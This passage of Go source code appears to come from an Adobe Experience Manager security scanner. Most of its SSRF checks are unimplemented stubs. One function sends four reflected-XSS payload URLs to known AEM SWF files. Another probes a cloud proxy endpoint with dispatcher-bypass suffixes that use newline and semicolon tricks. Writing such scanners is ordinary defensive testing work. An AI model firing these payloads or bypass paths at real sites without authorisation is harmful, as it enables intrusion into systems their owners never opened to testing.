	// TODO: Implement full SSRF detection with callback server
	return nil
}

// checkReportingServicesServlet checks for SSRF via ReportingServicesServlet
func checkReportingServicesServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	if ssrfHost == "" {
		return nil
	}
	// TODO: Implement full SSRF detection
	return nil
}

// checkSiteCatalystServlet checks for SSRF via SiteCatalystServlet
func checkSiteCatalystServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	if ssrfHost == "" {
		return nil
	}
	// TODO: Implement full SSRF detection
	return nil
}

// checkAutoProvisioningServlet checks for SSRF via AutoProvisioningServlet
func checkAutoProvisioningServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	if ssrfHost == "" {
		return nil
	}
	// TODO: Implement full SSRF detection
	return nil
}

// checkOpenSocialProxy checks for SSRF via OpenSocial proxy
func checkOpenSocialProxy(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	if ssrfHost == "" {
		return nil
	}
	// TODO: Implement full SSRF detection
	return nil
}

// checkOpenSocialMakeRequest checks for SSRF via OpenSocial makeRequest
func checkOpenSocialMakeRequest(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	if ssrfHost == "" {
		return nil
	}
	// TODO: Implement full SSRF detection
	return nil
}

// checkSWFXSS checks for XSS via SWF files
func checkSWFXSS(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding

	swfPaths := []string{
		"/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)",
		"/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentPath=%5c%22%29%29%7dcatch%28e%29%7balert%28document.domain%29%7d//",
		"/libs/dam/widgets/resources/swfupload/swfupload_f9.swf?swf?movieName=%22%5D%29%7dcatch%28e%29%7bif%28%21this.x%29alert%28document.domain%29%2Cthis.x%3D1%7d//",
		"/libs/cq/ui/resources/swfupload/swfupload.swf?movieName=%22%5D%29%7dcatch%28e%29%7bif%28%21this.x%29alert%28document.domain%29%2Cthis.x%3D1%7d//",
	}

	for _, path := range swfPaths {
		url := NormalizeURL(baseURL, path)
		resp, err := client.Get(url, nil)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			ct := ContentType(resp.Header.Get("Content-Type"))
			cd := resp.Header.Get("Content-Disposition")
			if ct == "application/x-shockwave-flash" && cd == "" {
				findings = append(findings, Finding{
					Name:        "Reflected XSS via SWF",
					URL:         url,
					Description: "AEM exposes SWF that might be vulnerable to reflected XSS.",
				})
				return findings
			}
		}
		resp.Body.Close()
	}
	return findings
}

// checkExternalJobServlet checks for vulnerable ExternalJobServlet
func checkExternalJobServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
	var findings []Finding
	r := RandomString(3)

	// Base64 deserialization payload (simplified - full payload would be longer)
	// This is a placeholder - actual payload would be the full Java deserialization payload
	paths := []string{
		"/libs/dam/cloud/proxy",
		"///libs///dam///cloud///proxy",
	}
	suffixes := []string{
		".json", ".css", ".js", ".html", ".ico", ".png", ".gif", ".1.json",
		"...4.2.1...json", ".json;%0a" + r + ".css", ".json;%0a" + r + ".html", ".json;%0a" + r + ".ico",
	}

	// Note: Full implementation would require multipart form data with the deserialization payload
	// This is a simplified check
	for _, path := range paths {
		for _, suffix := range suffixes {
			url := NormalizeURL(baseURL, path+suffix)
			headers := map[string]string{
				"Referer": baseURL,
			}
			// TODO: Implement full multipart POST with deserialization payload
			// For now, just check if endpoint exists
			resp, err := client.Get(url, headers)
			if err != nil {
				continue
			}
			resp.Body.Close()
			// Full check would POST multipart data and look for "Java heap space" error
		}
	}
	return findings
}

